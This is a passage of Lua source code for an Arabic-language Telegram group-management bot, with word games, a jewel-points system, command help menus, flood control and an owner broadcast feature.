name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
taha = '🕐¦اسرع واحد يحلها » {'..name..'}'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(database:get('fayomy:'..bot_id..'klmoa'..msg.chat_id_) or 'لفاتع')..'' and not database:get('fayomy:'..bot_id..'l:id1'..msg.chat_id_) then
if not database:get('fayomy:'..bot_id..'l:id1'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل حزوره ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:incrby('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
database:incrby('fayomy:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
end
database:set('fayomy:'..bot_id..'l:id1'..msg.chat_id_,true)
end 
if text == 'المعاني' and database:get('fayomy:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('fayomy:'..bot_id..'l:id2'..msg.chat_id_)
katu = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = katu[math.random(#katu)]
database:set('fayomy:'..bot_id..'means'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
taha = '🔵¦اول واحد يكتب معنئ السمايل » {'..name..'}'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(database:get('fayomy:'..bot_id..'means'..msg.chat_id_) or 'لفاتع')..'' and not database:get('fayomy:'..bot_id..'l:id2'..msg.chat_id_) then
if not database:get('fayomy:'..bot_id..'l:id2'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل المعاني ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:incrby('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
database:incrby('fayomy:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
end
database:set('fayomy:'..bot_id..'l:id2'..msg.chat_id_,true)
end 
if text == 'العكس' and database:get('fayomy:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('fayomy:'..bot_id..'l:id3'..msg.chat_id_)
katu = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = katu[math.random(#katu)]
database:set('fayomy:'..bot_id..'aks'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'موحلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'عدل','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
taha = '✖️¦عكس كلمه » {'..name..'} ⚜️'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(database:get('fayomy:'..bot_id..'aks'..msg.chat_id_) or 'لفاتع')..'' and not database:get('fayomy:'..bot_id..'l:id3'..msg.chat_id_) then
if not database:get('fayomy:'..bot_id..'l:id3'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل العكس ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:incrby('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
database:incrby('fayomy:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
end
database:set('fayomy:'..bot_id..'l:id3'..msg.chat_id_,true)
end 
if text =='مجوهراتي' then 
if tonumber((database:get('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
taha = '*💎¦ ليس لديك مجوهرات \n📬¦ للحصول على مجوهرات ارسل الاسرع وابدأ اللعب*\n'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
else
taha = '*💎¦ عدد مجوهراتك الحاليه  ('..(database:get('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_))..')*'
taha1 = '*💎¦ مجموع مجوهراتك  ('..(database:get('fayomy:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))..')*'

send(msg.chat_id_, msg.id_, 1,''..taha..'\n'..taha1..'', 1, 'md')
end
end
if text:match('^رسائل المجوهرات (%d+)$') and (is_creator(msg) or is_creatorbasic(msg)) then
local kara = {string.match(text, "^(رسائل المجوهرات) (%d+)$")}
if tonumber(kara[2]) > 500 or tonumber(kara[2]) < 1 then
msgg = '💎┇لا تستطيع وضع اكثر من 500 رساله ❌ '
send(msg.chat_id_, msg.id_, 1, msgg, 1, 'html')
else
database:set('fayomy:'..bot_id..'gamepoint' .. msg.chat_id_, kara[2] or 50)
send(msg.chat_id_, msg.id_, 1,'💎¦تم اضافه عدد الرسائل المطلوب ✅  ', 1, 'md')
end
end
if text == 'بيع مجوهراتي' then
if tonumber((database:get('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
taha = '*💠¦ ليس لديك مجوهرات \n📬¦ للحصول على مجوهرات ارسل الاسرع وابدأ اللعب*\n'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
else
taha = (database:get('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(database:get('fayomy:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
database:incrby('fayomy:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,taha)  
database:del('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)
taha = tonumber((database:get('fayomy:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
send(msg.chat_id_, msg.id_, 1,'💎¦ تم بيع جواهرك كل مجوهره تساوي '..taha..' رساله', 'md')
end
end
if text == 'حذف مجوهراتي' then
database:del('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)  
database:del('fayomy:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_)  
send(msg.chat_id_, msg.id_, 1, "تم حذف جميع مجوهراتك", 1, "md") 
end
if text == 'حذف رسائلي' then
database:del('fayomy:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
database:del('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, "🗑 ※ تم حذف رسائلك  ✓", 1, "md") 
end
---------------------------------------------------------------------------
if text == 'تفعيل اللعبه' and (is_owner(msg) or is_creatorbasic(msg)) then   
send(msg.chat_id_, msg.id_, 1,"👾 | تم تفعيل اللعبة   ✓\n👾 | تم تفعيل اللعبة   ✓ هناك خمس العاب 👾\n 🕛 | ارسل امر (الاسرع) لبدء لعبه الاسرع  👾\n🏴 | ارسل امر (سمايلات) لبدء لعبه السمايلات 👾\n🤔 | ارسل امر (حزوره) لبدء لعبه الحزوره 👾\n💿| ارسل امر (المعاني) لبدء لعبه المعاني 👾\n✖️| ارسل امر (العكس) لبدء لعبه العكس 👾\n   ✓", 1, 'md')
database:set('fayomy:'..bot_id..'lock_geam'..msg.chat_id_,true)  
end
if text == 'تعطيل اللعبه' and (is_owner(msg) or is_creatorbasic(msg)) then  
taha = '❗️※ تم تعطيل اللعبه  ✓' 
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:del('fayomy:'..bot_id..'lock_geam'..msg.chat_id_) 
end
----------------
if text:match("^الاوامر$") and (is_mod(msg) or is_creatorbasic(msg)) then
local help = redis:get('fayomy:'..bot_id..'help')
local text =  [[
※ source ᴏɴᴇ ɪɴ ɪʀᴀǫ 🔱 »

♦️➖▪️➖▪️➖▪️➖▪️➖♦️

※ هناك  (4)اوامر لعرضها ⚙️

♦️➖▪️➖▪️➖▪️➖▪️➖♦️

※ م1 ☰ لعرض اوامر الحمايه 🗑

※ م2☰ لعرض اوامر الادمنيه 👨🏼‍✈️

※ م3 ☰ لعرض اوامر المدراء   👨🏻‍⚖️

※ م4☰ لعرض اوامر المطورين  👨🏻‍🚀

♦️➖▪️➖▪️➖▪️➖▪️➖♦️

※ Ch  ☰ @FAYOMYYT 🃏
]]
send(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if (text and text == 'تغير امر م1') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('fayomy:'..bot_id..'h11'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local king2 = redis:get('fayomy:'..bot_id..'h11'..msg.sender_user_id_..'')
if king2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('fayomy:'..bot_id..'h11'..msg.sender_user_id_..'', 'no')
redis:set('fayomy:'..bot_id..'h1', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
if (text:match("^م1$") or text == "م١") and (is_mod(msg) or is_creatorbasic(msg)) then
local h1 = redis:get('fayomy:'..bot_id..'h1')
local text =  [[
※ source ᴏɴᴇ ɪɴ ɪʀᴀǫ 🔱 »
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ اوامر حمايه بالمسح  🔰
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ قفل ☰ لقفل امر 🔒
※ فتح ☰ لفتح امر🔓
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ الروابط  | 🔰
※ المعرف |🌀
※ التاك |📥
※ الشارحه |〰
※ التعديل | 🛃
※ التثبيت | 📌
※ المواقع | ♨️
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ التكرار  |📈
※ المتحركه |🎌
※ الملفات |📔
※ الصور |🌠
※ الملصقات |🔐
※ الفيديو |🎥
※ الانلاين |📡
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ الدردشه |📇
※ التوجيه |♻️
※ الاغاني |✳️
※ الصوت |🔊
※ الجهات |📥
※ الماركدون | ⛎
※ الاشعارات |💤
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ الشبكات |👥
※ البوتات |🤖
※ الكلايش |🚸
※ العربيه|🆎
※ الانكليزيه |♍️
※الميديا |♨️
※الكلايش| 📃
※قفل تعديل الميديا| 📠
※قفل بصمه الفيديو | 📽
※ الكل بالثواني + العدد |🚯
※ الكل بالساعه + العدد |🚷
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ Ch  ☰ @FAYOMYYT 🃏
]]
send(msg.chat_id_, msg.id_, 1, (h1 or text), 1, 'html')
end
if (text and text == 'تغير امر م2') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('fayomy:'..bot_id..'h22'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local king2 = redis:get('fayomy:'..bot_id..'h22'..msg.sender_user_id_..'')
if king2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('fayomy:'..bot_id..'h22'..msg.sender_user_id_..'', 'no')
redis:set('fayomy:'..bot_id..'h2', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
if (text:match("^م2$") or text == "م٢") and (is_mod(msg) or is_creatorbasic(msg)) then
local h2 = redis:get('fayomy:'..bot_id..'h2')
local text =  [[

※ اوامر الادمنيه 👤
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ رفع ادمن | 🔼
※ تنزيل ادمن | 🔽
※ رفع عضو مميز | ⏫
※ تنزيل عضو مميز | ⏬
※ منع + الكلمه | ♏️
※ الغاء منع + الكلمه | 🆎
※ ايدي + رد | 🆔
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ الغاء كتم | 🔆
※ كتم | 🔅
※ حظر | ✳️
※ طرد | ♦️
※ الغاء حظر | ❇️
※ تثبيت | ❗️
※ الغاء تثبيت | ❕
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ قائمة المنع | 💢
※ المقيدين | 🚱 
※ المحظورين |⛔️ 
※ المكتومين | 🚷
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
👋🏻 ※ وضع/حذف/جلب الترحيب
👋🏻 ※ تفعيل/تعطيل الترحيب
⚠️ ※ تفعيل/تعطيل الابلاغ
⚠️ ※ تعين عدد الابلاغ + العدد
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
📡 ※ معلومات + ايدي
📲 ※ الحساب + ايدي
📣 ※ كرر + الكلمه
💭 ※ ايدي
💭 ※ جهاتي
💭 ※ سحكاتي
💭 ※ رسائلي
💭 ※ ابلاغ
💭 ※ عدد الكروب
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
🔘※وضع + الاوامر الادناه 
📝※اسم
📝※رابط
📝※صوره
📝※وصف
📝※قوانين
🗑※مسح + الاوامر الادناه
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
📮※قائمه المنع
📮※المحظورين
📮※المكتومين
📮※القوانين
📮※البوتات
📮※الصوره
📮※الرابط
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ Ch  ☰ @FAYOMYYT 🃏
]]
send(msg.chat_id_, msg.id_, 1, (h2 or text), 1, 'html')
end
if (text and text == 'تغير امر م3') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('fayomy:'..bot_id..'h33'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local king2 = redis:get('fayomy:'..bot_id..'h33'..msg.sender_user_id_..'')
if king2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('fayomy:'..bot_id..'h33'..msg.sender_user_id_..'', 'no')
redis:set('fayomy:'..bot_id..'h3', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
if (text:match("^م3$") or text == "م٣") and (is_mod(msg) or is_creatorbasic(msg)) then
local h3 = redis:get('fayomy:'..bot_id..'h3')
local text =  [[
※ source ᴏɴᴇ ɪɴ ɪʀᴀǫ 🔱 »
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ اوامر المدراء  🤵🏻
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※وضع :- مع الاوامر الادناه 

※ تكرار +العدد | 🔼
※ زمن تكرار +العدد | 🔽

※ رفع عضو مميز  | ⏫
※ تنزيل عضو مميز | ⏬

※ تفعيل / تعطيل الايدي بالصوره | ♏️
※ تفعيل / تعطيل الايدي  | ??
※ تفعيل / تعطيل ردود  المطور   | 🆔
※ تفعيل / تعطيل اللعبه | 🎅🏻
※ تفعيل / تعطيل ردود  المدير | 
※ تفعيل / تعطيل التثبيت | 
※ تفعيل / تعطيل اطردني | 
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ رفع الادمنيه | 
※ اضف رد / حذف رد  | 🔅
※ الادمنية | ✳️
※ ردود المدير | ♦️
※ ادمنيه المجموعه | ❇️
※  الاعضاء المميزين  | ❗️
※ تنظيف+ عدد  | ❕
※ مسح الادمنيه | 
※ مسح الاعضاء المميزين |🎠
※ مسح المدراء  
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ اوامر المنشئين |👨🏿‍🚀
※ رفع /تنزيل مدير
※ المدراء |⛔️ 
※ مسح المدراء | 🚷
※ طرد المتروكين / طرد المحذوفين 
※ تنظيف قائمه المحظورين 
※ تعين /مسح الايدي 
※ اضف /مسح صلاحيه
※ اضف /مسح امر +اسم الامر 
※ تفعيل /تعطيل الاعلانات 
※تفعيل/تعطيل الحظر /الطرد 
※اضف /حذف امر +اسم الامر
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ Ch  ☰ @FAYOMYYT 🃏
]]
send(msg.chat_id_, msg.id_, 1, (h3 or text), 1, 'html')
end
if (text and text == 'تغير امر م4') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('fayomy:'..bot_id..'h44'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local king2 = redis:get('fayomy:'..bot_id..'h44'..msg.sender_user_id_..'')
if king2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('fayomy:'..bot_id..'h44'..msg.sender_user_id_..'', 'no')
redis:set('fayomy:'..bot_id..'h4', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return
false
end
end
if (text:match("^م4$") or text == "م٤") and is_sudo(msg) then
local h4 = redis:get('fayomy:'..bot_id..'h4')
local text =  [[
※ source ᴏɴᴇ ɪɴ ɪʀᴀǫ 🔱 »
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ اوامر  المطورين  👨‍💻
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※تفعيل / تعطيل

※ المغادره  | 🔼
※ الاذاعه  | 🔽
※ التفعيل التلقائي   | ⏫
 
🔘※وضع وقت + عدد
🔘※المده1 + id
🔘※ المده2 + id
🔘※المده3 + id
🔘※ وقت المجموعه + id
🔘※مغادره + id
🔘※ مغادره
🔘※اضف/مسح رد للكل
📋※ردود المطور
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
🔘※تغير امر المطور
🔘※تغير/مسح امر المطور بالكليشه
🔘※ تعين/مسح مجموعه المطور
📄※ عدد الكروبات/الاحصائيات
📋※ روابط الكروبات


🚫※حظر عام
⏺※الغاء العام
🚫※ كتم عام
⏺※ الغاء كتم العام
📋※قائمه العام
📋※ المكتومين عام

↕️※ اضف/حذف مطور
↕️※ رفع/تنزيل مدير
↕️※ رفع/تنزيل منشئ
📋※ المدراء
📋※ المنشئين
📋※ المطورين

🗑※ استعاده الاوامر
🗑※ مسح ردود المطور
🗑※ مسح المطورين
🗑※ مسح قائمه العام
🗑※ مسح المدراء
🗑※مسح المنشئين
🗑※مسح المكتومين عام

🏷※ تغير امر {الاوامر ، م1 ، م2 ، م3 ، م4}
🏷※ مشاهده منشور
🏷※اذاعه

🗂※الملفات
🗂※ تفعيل/تفعيل ملف + اسم الملف
🗂※ اضف/حذف/جلب ملف + اسم الملف
🗂※ مسح جميع الملفات

♦️➖▪️➖▪️➖▪️➖▪️➖♦️
🗯※ تغير نص الانلاين + النص
🗯※ تغير رابط الانلاين + الرابط 
🗯※ تفعيل/تعطيل الانلاين
♦️➖▪️➖▪️➖▪️➖▪️➖♦️
※ Ch  ☰ @FAYOMYYT 🃏

]]
send(msg.chat_id_, msg.id_, 1, (h4 or text), 1, 'html')
end
if text:match("^اصدار$") or text:match("^الاصدار$") or text:match("^السورس$") or text:match("^سورس$") then
local text =  [[
👋┇اهلا بك في سورس فيومي 

🌐┇<strong>FAYOME GAMER</strong>

🦁┇<a href="https://telegram.me/FAYOMYYT">قناه المبرمج</a>
📜┇<a href="https://telegram.me/GROUB_FAYOMY">كروب المبرمج</a>
??┇<a href="https://t.me/FAYOMYYT">تهكير ببجي</a>
🎵┇<a href="https://t.me/FAYOMYTM">تواصل مع المبرمج</a>
➰┇<a href="https://t.me/FAYOMYYT">لتفعيل البوت </a>

🔎┇<a href="https://t.me/FAYOMYYT/134">طريقه التنصيب</a>

📮┇<a href="t.me/FAYOMYYT">لـ تواصل </a> 
]]
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^اريد رابط حذف$") or text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^الرابط حذف$") or text:match("^اريد رابط الحذف$") then
local text =  [[
🗑┇رابط حذف التلي ، ⬇
‼┇احذف ولا ترجع عيش حياتك'
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🔎┇<a href="https://telegram.org/deactivate">اضغط هنا للحذف الحساب" </a>
]]
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
end
function tdcli_update_callback(data)
local chat = {}
if (data.ID == "UpdateNewMessage") then
local Data_Fayomy = data
msg = data.message_
text = msg.content_.text_
if database:get('fayomy:'..bot_id.."charge:"..msg.chat_id_) then
database:sadd("fyaomy:good"..bot_id..os.date("%d"),msg.chat_id_)
database:del("fyaomy:good"..bot_id..( tonumber(os.date("%d")) - 1) )
if (not is_mod(msg) and not is_vip(msg)) then 
print("»» is member "..msg.sender_user_id_) 
if is_muted(msg.sender_user_id_, msg.chat_id_) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "fayomy"
end
z_fayomy = FMCheckMsg(msg)
if z_fayomy and z_fayomy == "stop" then 
if msg.content_.ID == "MessageChatAddMembers" then
if msg.content_.members_[0].type_.ID == 'UserTypeBot' then
if database:get("lock_bot:fayomy"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
end
if database:get("lock_botAndBan:fayomy"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
end
end
end
if database:get("lock_lllll:fayomy"..msg.chat_id_..bot_id) then
local hash = 'flood:max:'..bot_id..msg.chat_id_
if not database:get(hash) then
floodMax = 10
else
floodMax = tonumber(database:get(hash))
end
local hash = 'fayomy:'..bot_id..'flood:time:'..msg.chat_id_
if not database:get(hash) then
floodTime = 1
else
floodTime = tonumber(database:get(hash))
end
if not is_vip(msg) then
if bot_id then
if not is_vip(msg) then
local hash = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msg-num'
local msgs = tonumber(database:get(hash) or 0)
if msgs > (floodMax - 1) then
local user = msg.sender_user_id_
local chat = msg.chat_id_
local channel = msg.chat_id_
local user_id = msg.sender_user_id_
local banned = is_banned(user_id, msg.chat_id_)
if banned then
else
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
user_id = msg.sender_user_id_
o = database:get("fmahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
if (o and (tonumber(o) >= 5)) then
database:set("lock_media:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_audeo:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_video:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_photo:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_stecker:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_voice:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_gif:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_note:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_word:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_mark:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_link:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_new:fayomy"..msg.chat_id_..bot_id,"ok")
database:set('fayomy:'..bot_id..'get:photo'..msg.chat_id_,true)
send(msg.chat_id_, 0, 1, '⚠️┇تم كشف عمليه تخريب في المجموعة \n‼️┇وتم قفل الميديا وسيتم طرد جميع الاشخاص الذين يقومون بعمل تكرار', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🎫┇الايدي ~⪼*('..msg.sender_user_id_..')* \n❕┇قمت بعمل تكرار للرسائل المحدده\n☑┇وتم كتمك في المجموعه\n', 1, 'md')
end 
if (o and (tonumber(o) > 5)) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
database:incr("fayomy:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
database:sadd('fayomy:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
end
end
database:setex(hash, floodTime, msgs+1)
end
end
end
end
return "FaYoMy"
end
end
if data.message_.content_.text_ then   
if database:get("fayomy:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_) then
local fayomy_edit_text = database:get("fayomy:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_)
if fayomy_edit_text then
data.message_.content_.text_ = fayomy_edit_text
end
end
end
local msg = data.message_
text = msg.content_.text_
if is_sudo(msg) then 
if database:get("fayomy:set_if_bc_new:"..bot_id..msg.sender_user_id_) then 
database:del("fayomy:set_if_bc_new:"..bot_id..msg.sender_user_id_)
local pro = database:scard('fayomy:'..bot_id..'pro:groups') or 0
if text then 
local gpss = database:smembers( 'fayomy:'..bot_id.."groups") or 0
for i=1, #gpss do
if not database:sismember('fayomy:'..bot_id..'pro:groups', gpss[i]) then
send(gpss[i], 0, 1, text, 1, 'html')		
end					
end
end
if (data.message_.content_.sticker_) then 
gpss = database:smembers( 'fayomy:'..bot_id.."groups") or 0
for i=1, #gpss do
if not database:sismember('fayomy:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendSticker(gpss[i], 0,0, 1, nil, data.message_.content_.sticker_.sticker_.persistent_id_)
end
end
elseif (data.message_.content_.voice_) then 
gpss = database:smembers( 'fayomy:'..bot_id.."groups") or 0
for i=1, #gpss do
if not database:sismember('fayomy:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendVoice(gpss[i], 0,0, 1, nil, data.message_.content_.voice_.voice_.persistent_id_)
end
end
elseif (data.message_.content_.video_) then 
gpss = database:smembers( 'fayomy:'..bot_id.."groups") or 0
for i=1, #gpss do
if not database:sismember('fayomy:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendVideo(gpss[i], 0,0, 1, nil, data.message_.content_.video_.video_.persistent_id_)
end
end
elseif (data.message_.content_.animation_) then 
gpss = database:smembers( 'fayomy:'..bot_id.."groups") or 0
for i=1, #gpss do
if not database:sismember('fayomy:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendDocument(gpss[i], 0,0, 1, nil, data.message_.content_.animation_.animation_.persistent_id_)
end
end
elseif (data.message_.content_.document_) then
gpss = database:smembers( 'fayomy:'..bot_id.."groups") or 0
for i=1, #gpss do
if not database:sismember('fayomy:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendDocument(gpss[i], 0,0, 1, nil, data.message_.content_.document_.document_.persistent_id_)
end
end
elseif (data.message_.content_.photo_) then
local id_king = nil
if data.message_.content_.photo_.sizes_[0] then
id_king = data.message_.content_.photo_.sizes_[0].photo_.persistent_id_
end
if data.message_.content_.photo_.sizes_[1] then
id_king = data.message_.content_.photo_.sizes_[1].photo_.persistent_id_
end
if data.message_.content_.photo_.sizes_[2] then
